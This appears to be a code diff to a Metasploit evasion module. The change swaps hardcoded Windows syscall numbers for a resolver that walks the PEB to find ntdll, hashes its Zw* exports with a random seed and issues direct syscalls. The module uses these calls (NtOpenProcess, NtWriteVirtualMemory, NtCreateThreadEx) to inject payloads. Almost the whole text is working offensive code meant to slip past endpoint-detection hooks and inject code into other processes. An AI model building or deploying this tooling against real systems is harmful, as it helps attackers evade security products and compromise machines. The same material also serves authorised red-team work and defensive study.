+        mov rdx, [rsp+16] \\n\\
+        mov r8, [rsp+24] \\n\\
+        mov r9, [rsp+32] \\n\\
+        mov r10, rcx \\n\\
+        syscall                    \\n\\
+        ret \\n\\
+    ");
+    ^
   end
 
   def nt_write
     %^
-        NtWriteVirtualMemory: \\n\\
-            mov rax, gs:[0x60]                               \\n\\
-        NtWriteVirtualMemory_Check_X_X_XXXX:                \\n\\
-            cmp dword ptr [rax+0x118], 6 \\n\\
-            je  NtWriteVirtualMemory_Check_6_X_XXXX \\n\\
-            cmp dword ptr [rax+0x118], 10 \\n\\
-            je  NtWriteVirtualMemory_Check_10_0_XXXX \\n\\
-            jmp NtWriteVirtualMemory_SystemCall_Unknown \\n\\
-        NtWriteVirtualMemory_Check_6_X_XXXX:                \\n\\
-            cmp dword ptr [rax+0x11c], 1 \\n\\
-            je  NtWriteVirtualMemory_Check_6_1_XXXX \\n\\
-            cmp dword ptr [rax+0x11c], 2 \\n\\
-            je  NtWriteVirtualMemory_SystemCall_6_2_XXXX \\n\\
-            cmp dword ptr [rax+0x11c], 3 \\n\\
-            je  NtWriteVirtualMemory_SystemCall_6_3_XXXX \\n\\
-            jmp NtWriteVirtualMemory_SystemCall_Unknown \\n\\
-        NtWriteVirtualMemory_Check_6_1_XXXX:                \\n\\
-            cmp word ptr [rax+0x120], 7600 \\n\\
-            je  NtWriteVirtualMemory_SystemCall_6_1_7600 \\n\\
-            cmp word ptr [rax+0x120], 7601 \\n\\
-            je  NtWriteVirtualMemory_SystemCall_6_1_7601 \\n\\
-            jmp NtWriteVirtualMemory_SystemCall_Unknown \\n\\
-        NtWriteVirtualMemory_Check_10_0_XXXX:               \\n\\
-            cmp word ptr [rax+0x120], 10240 \\n\\
-            je  NtWriteVirtualMemory_SystemCall_10_0_10240 \\n\\
-            cmp word ptr [rax+0x120], 10586 \\n\\
-            je  NtWriteVirtualMemory_SystemCall_10_0_10586 \\n\\
-            cmp word ptr [rax+0x120], 14393 \\n\\
-            je  NtWriteVirtualMemory_SystemCall_10_0_14393 \\n\\
-            cmp word ptr [rax+0x120], 15063 \\n\\
-            je  NtWriteVirtualMemory_SystemCall_10_0_15063 \\n\\
-            cmp word ptr [rax+0x120], 16299 \\n\\
-            je  NtWriteVirtualMemory_SystemCall_10_0_16299 \\n\\
-            cmp word ptr [rax+0x120], 17134 \\n\\
-            je  NtWriteVirtualMemory_SystemCall_10_0_17134 \\n\\
-            cmp word ptr [rax+0x120], 17763 \\n\\
-            je  NtWriteVirtualMemory_SystemCall_10_0_17763 \\n\\
-            cmp word ptr [rax+0x120], 18362 \\n\\
-            je  NtWriteVirtualMemory_SystemCall_10_0_18362 \\n\\
-            cmp word ptr [rax+0x120], 18363 \\n\\
-            je  NtWriteVirtualMemory_SystemCall_10_0_18363 \\n\\
-            cmp word ptr [rax+0x120], 19041 \\n\\
-            je  NtWriteVirtualMemory_SystemCall_10_0_19041 \\n\\
-            cmp word ptr [rax+0x120], 19042 \\n\\
-            je  NtWriteVirtualMemory_SystemCall_10_0_19042 \\n\\
-            jmp NtWriteVirtualMemory_SystemCall_Unknown \\n\\
-        NtWriteVirtualMemory_SystemCall_6_1_7600:           \\n\\
-            mov eax, 0x0037 \\n\\
-            jmp NtWriteVirtualMemory_Epilogue \\n\\
-        NtWriteVirtualMemory_SystemCall_6_1_7601:           \\n\\
-            mov eax, 0x0037 \\n\\
-            jmp NtWriteVirtualMemory_Epilogue \\n\\
-        NtWriteVirtualMemory_SystemCall_6_2_XXXX:           \\n\\
-            mov eax, 0x0038 \\n\\
-            jmp NtWriteVirtualMemory_Epilogue \\n\\
-        NtWriteVirtualMemory_SystemCall_6_3_XXXX:           \\n\\
-            mov eax, 0x0039 \\n\\
-            jmp NtWriteVirtualMemory_Epilogue \\n\\
-        NtWriteVirtualMemory_SystemCall_10_0_10240:         \\n\\
-            mov eax, 0x003a \\n\\
-            jmp NtWriteVirtualMemory_Epilogue \\n\\
-        NtWriteVirtualMemory_SystemCall_10_0_10586:         \\n\\
-            mov eax, 0x003a \\n\\
-            jmp NtWriteVirtualMemory_Epilogue \\n\\
-        NtWriteVirtualMemory_SystemCall_10_0_14393:         \\n\\
-            mov eax, 0x003a \\n\\
-            jmp NtWriteVirtualMemory_Epilogue \\n\\
-        NtWriteVirtualMemory_SystemCall_10_0_15063:         \\n\\
-            mov eax, 0x003a \\n\\
-            jmp NtWriteVirtualMemory_Epilogue \\n\\
-        NtWriteVirtualMemory_SystemCall_10_0_16299:         \\n\\
-            mov eax, 0x003a \\n\\
-            jmp NtWriteVirtualMemory_Epilogue \\n\\
-        NtWriteVirtualMemory_SystemCall_10_0_17134:         \\n\\
-            mov eax, 0x003a \\n\\
-            jmp NtWriteVirtualMemory_Epilogue \\n\\
-        NtWriteVirtualMemory_SystemCall_10_0_17763:         \\n\\
-            mov eax, 0x003a \\n\\
-            jmp NtWriteVirtualMemory_Epilogue \\n\\
-        NtWriteVirtualMemory_SystemCall_10_0_18362:         \\n\\
-            mov eax, 0x003a \\n\\
-            jmp NtWriteVirtualMemory_Epilogue \\n\\
-        NtWriteVirtualMemory_SystemCall_10_0_18363:         \\n\\
-            mov eax, 0x003a \\n\\
-            jmp NtWriteVirtualMemory_Epilogue \\n\\
-        NtWriteVirtualMemory_SystemCall_10_0_19041:         \\n\\
-            mov eax, 0x003a \\n\\
-            jmp NtWriteVirtualMemory_Epilogue \\n\\
-        NtWriteVirtualMemory_SystemCall_10_0_19042:         \\n\\
-            mov eax, 0x003a \\n\\
-            jmp NtWriteVirtualMemory_Epilogue \\n\\
-        NtWriteVirtualMemory_SystemCall_Unknown:            \\n\\
-            ret \\n\\
-        NtWriteVirtualMemory_Epilogue: \\n\\
-            mov r10, rcx \\n\\
-            syscall \\n\\
-            ret \\n\\
-        ");
-        ^
+    __asm__("NtWriteVirtualMemory: \\n\\
+        mov [rsp +8], rcx          \\n\\
+        mov [rsp+16], rdx \\n\\
+        mov [rsp+24], r8 \\n\\
+        mov [rsp+32], r9 \\n\\
+        sub rsp, 0x28 \\n\\
+        mov ecx, 0x#{calc_hash 'NtWriteVirtualMemory'}        \\n\\
+        call GetSyscallNumber  \\n\\
+        add rsp, 0x28 \\n\\
+        mov rcx, [rsp +8]          \\n\\
+        mov rdx, [rsp+16] \\n\\
+        mov r8, [rsp+24] \\n\\
+        mov r9, [rsp+32] \\n\\
+        mov r10, rcx \\n\\
+        syscall                    \\n\\
+        ret \\n\\
+    ");
+    ^
   end
 
   def headers
@@ -661,6 +170,45 @@ class MetasploitModule < Msf::Evasion
 
   def defines
     %^
+        #define _SEED 0x#{@hash.to_s(16)}
+        #define _ROR8(v) (v >> 8 | v << 24)
+        #define MAX_SYSCALLS 500
+        #define _RVA2VA(Type, DllBase, Rva) (Type)((ULONG_PTR) DllBase + Rva)
+
+
+        typedef struct _SYSCALL_ENTRY
+        {
+            DWORD Hash;
+            DWORD Address;
+        } SYSCALL_ENTRY, *P_SYSCALL_ENTRY;
+
+        typedef struct _SYSCALL_LIST
+        {
+            DWORD Count;
+            SYSCALL_ENTRY Entries[MAX_SYSCALLS];
+        } SYSCALL_LIST, *P_SYSCALL_LIST;
+
+        typedef struct _PEB_LDR_DATA {
+            BYTE Reserved1[8];
+            PVOID Reserved2[3];
+            LIST_ENTRY InMemoryOrderModuleList;
+        } PEB_LDR_DATA, *P_PEB_LDR_DATA;
+
+        typedef struct _LDR_DATA_TABLE_ENTRY {
+            PVOID Reserved1[2];
+            LIST_ENTRY InMemoryOrderLinks;
+            PVOID Reserved2[2];
+            PVOID DllBase;
+        } LDR_DATA_TABLE_ENTRY, *P_LDR_DATA_TABLE_ENTRY;
+
+        typedef struct _PEB {
+            BYTE Reserved1[2];
+            BYTE BeingDebugged;
+            BYTE Reserved2[1];
+            PVOID Reserved3[2];
+            P_PEB_LDR_DATA Ldr;
+        } PEB, *P_PEB;
+
         typedef struct _PS_ATTRIBUTE
         {
             ULONG  Attribute;
@@ -690,33 +238,17 @@ class MetasploitModule < Msf::Evasion
             PVOID           SecurityQualityOfService;
         } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
 
-        typedef struct _PS_ATTRIBUTE_LIST
-        {
-            SIZE_T       TotalLength;
-            PS_ATTRIBUTE Attributes[1];
-        } PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;
-
-
         typedef struct _CLIENT_ID
         {
             HANDLE UniqueProcess;
             HANDLE UniqueThread;
         } CLIENT_ID, *PCLIENT_ID;
 
-        EXTERN_C NTSTATUS NtClose(
-            IN HANDLE Handle);
-
-        EXTERN_C NTSTATUS NtOpenProcess(
-            OUT PHANDLE ProcessHandle,
-            IN ACCESS_MASK DesiredAccess,
-            IN POBJECT_ATTRIBUTES ObjectAttributes,
-            IN PCLIENT_ID ClientId OPTIONAL);
-
-
-        EXTERN_C NTSTATUS NtWaitForSingleObject(
-            IN HANDLE ObjectHandle,
-            IN BOOLEAN Alertable,
-            IN PLARGE_INTEGER TimeOut OPTIONAL);
+        typedef struct _PS_ATTRIBUTE_LIST
+        {
+            SIZE_T       TotalLength;
+            PS_ATTRIBUTE Attributes[1];
+        } PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;
 
         EXTERN_C NTSTATUS NtAllocateVirtualMemory(
             IN HANDLE ProcessHandle,
@@ -739,14 +271,139 @@ class MetasploitModule < Msf::Evasion
             IN SIZE_T MaximumStackSize,
             IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL);
 
-
         EXTERN_C NTSTATUS NtWriteVirtualMemory(
             IN HANDLE ProcessHandle,
             IN PVOID BaseAddress,
             IN PVOID Buffer,
             IN SIZE_T NumberOfBytesToWrite,
             OUT PSIZE_T NumberOfBytesWritten OPTIONAL);
+
+        EXTERN_C NTSTATUS NtOpenProcess(
+            OUT PHANDLE ProcessHandle,
+            IN ACCESS_MASK DesiredAccess,
+            IN POBJECT_ATTRIBUTES ObjectAttributes,
+            IN PCLIENT_ID ClientId OPTIONAL);
+
+        EXTERN_C NTSTATUS NtClose(
+            IN HANDLE Handle);
         ^
+  end
+
+  def syscall_parser
+    %@
+    SYSCALL_LIST _SyscallList;
+
+    DWORD HashSyscall(PCSTR FunctionName)
+    {
+        DWORD i = 0;
+        DWORD Hash = _SEED;
+
+        while (FunctionName[i])
+        {
+            WORD PartialName = *(WORD*)((ULONG64)FunctionName + i++);
+            Hash ^= PartialName + _ROR8(Hash);
+        }
+
+        return Hash;
+    }
+
+    BOOL PopulateSyscallList()
+    {
+        // Return early if the list is already populated.
+        if (_SyscallList.Count) return TRUE;
+
+        P_PEB Peb = (P_PEB)__readgsqword(0x60);
+        P_PEB_LDR_DATA Ldr = Peb->Ldr;
+        PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
+        PVOID DllBase = NULL;
+
+        // Get the DllBase address of NTDLL.dll. NTDLL is not guaranteed to be the second
+        // in the list, so it's safer to loop through the full list and find it.
+        P_LDR_DATA_TABLE_ENTRY LdrEntry;
+        for (LdrEntry = (P_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (P_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])
+        {
+            DllBase = LdrEntry->DllBase;
+            PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
+            PIMAGE_NT_HEADERS NtHeaders = _RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
+            PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
+            DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+            if (VirtualAddress == 0) continue;
+
+            ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);
+
+            // If this is NTDLL.dll, exit loop.
+            PCHAR DllName = _RVA2VA(PCHAR, DllBase, ExportDirectory->Name);
+
+            if ((*(ULONG*)DllName | 0x20202020) != 'ldtn') continue;
+            if ((*(ULONG*)(DllName + 4) | 0x20202020) == 'ld.l') break;
+        }
+
+        if (!ExportDirectory) return FALSE;
+
+        DWORD NumberOfNames = ExportDirectory->NumberOfNames;
+        PDWORD Functions = _RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
+        PDWORD Names = _RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
+        PWORD Ordinals = _RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);
+
+        // Populate _SyscallList with unsorted Zw* entries.
+        DWORD i = 0;
+        P_SYSCALL_ENTRY Entries = _SyscallList.Entries;
+        do
+        {
+            PCHAR FunctionName = _RVA2VA(PCHAR, DllBase, Names[NumberOfNames - 1]);
+
+            // Is this a system call?
+            if (*(USHORT*)FunctionName == 'wZ')
+            {
+                Entries[i].Hash = HashSyscall(FunctionName);
+                Entries[i].Address = Functions[Ordinals[NumberOfNames - 1]];
+
+                i++;
+                if (i == MAX_SYSCALLS) break;
+            }
+        } while (--NumberOfNames);
+
+        // Save total number of system calls found.
+        _SyscallList.Count = i;
+
+        // Sort the list by address in ascending order.
+        for (DWORD i = 0; i < _SyscallList.Count - 1; i++)
+        {
+            for (DWORD j = 0; j < _SyscallList.Count - i - 1; j++)
+            {
+                if (Entries[j].Address > Entries[j + 1].Address)
+                {
+                    // Swap entries.
+                    SYSCALL_ENTRY TempEntry;
+
+                    TempEntry.Hash = Entries[j].Hash;
+                    TempEntry.Address = Entries[j].Address;
+
+                    Entries[j].Hash = Entries[j + 1].Hash;
+                    Entries[j].Address = Entries[j + 1].Address;
+
+                    Entries[j + 1].Hash = TempEntry.Hash;
+                    Entries[j + 1].Address = TempEntry.Address;
+                }
+            }
+        }
+
+        return TRUE;
+    }
+
+    extern DWORD GetSyscallNumber(DWORD FunctionHash)
+    {
+        if (!PopulateSyscallList()) return -1;
+        for (DWORD i = 0; i < _SyscallList.Count; i++)
+        {
+            if (FunctionHash == _SyscallList.Entries[i].Hash)
+            {
+                return i;
+            }
+        }
+        return -1;
+    }
+    @
   end
 
   def filler
@@ -873,6 +530,7 @@ class MetasploitModule < Msf::Evasion
   end
 
   def run
+    @hash = rand 2**28..2**32 - 1
     comp_opts = '-masm=intel -w -mwindows '
     src = headers
     src << defines
@@ -880,8 +538,8 @@ class MetasploitModule < Msf::Evasion
     src << nt_close
     src << nt_create_thread
     src << nt_open_process
-    src << nt_wait
     src << nt_write
+    src << syscall_parser
     src << exec_func
     src << inject
     src << main
